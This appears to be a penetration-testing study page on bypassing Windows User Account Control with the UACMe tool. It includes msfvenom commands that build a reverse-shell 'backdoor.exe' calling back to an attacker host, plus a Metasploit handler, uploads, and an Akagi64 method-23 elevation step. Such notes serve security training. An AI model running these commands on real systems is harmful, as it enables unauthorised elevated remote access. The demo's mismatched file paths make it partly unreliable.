# Bypassing UAC With UACMe

## UAC (User Account Control)

* User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.&#x20;
* UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group.&#x20;
* A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt.&#x20;
* Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

## Bypassing UAC

* In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.&#x20;
* UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.&#x20;
* UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.&#x20;
* There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system.

## Bypassing UAC with UACMe

* UACMe is an open source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques.&#x20;
  * <mark style="color:red;">GitHub:</mark> <mark style="background-color:blue;">https://github.com/hfiref0x/UACME</mark>&#x20;
* The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10.&#x20;
* It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.&#x20;
* The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.

## Practical Demo

In this demo we have local administrator privileges and want to bypass the UAC concent prompt.

We will upload a payload generated with MSFVenom to the target, use UACMe to bypass the UAC prompt and execute the revershell payload, giving us a elevated privilege shell.&#x20;

Exploit the system to gain initial access.

<mark style="background-color:blue;">https://github.com/hfiref0x/UACME</mark>

Generating the payload:

* <mark style="color:yellow;">msfvenom -p windows/meterpreter/reverse\_tcp LHOST=IP LPORT=LOCALPORT -f exe > backdoor.exe</mark>

Set up a multi handler on msfconsole:

* <mark style="color:yellow;">use exploit/multi/handler</mark>
  * Set options the same as the generated msfvenom payload

#### Upload the revershell payload and the UACMe script to the C:\Users\admin\Appdata\Local\Temp directory

* <mark style="color:yellow;">upload /root/backdoor.exe .</mark>
* <mark style="color:yellow;">upload pathtoAkagi64.exe .</mark>

#### Execute the payload by bypassing UAC

* <mark style="color:yellow;">shell</mark>
* <mark style="color:yellow;">.\Akagi64.exe 23 C:\Temp\backdoor.exe</mark>

<mark style="color:purple;">NOTE:</mark> Always indicate the full path to the file to run
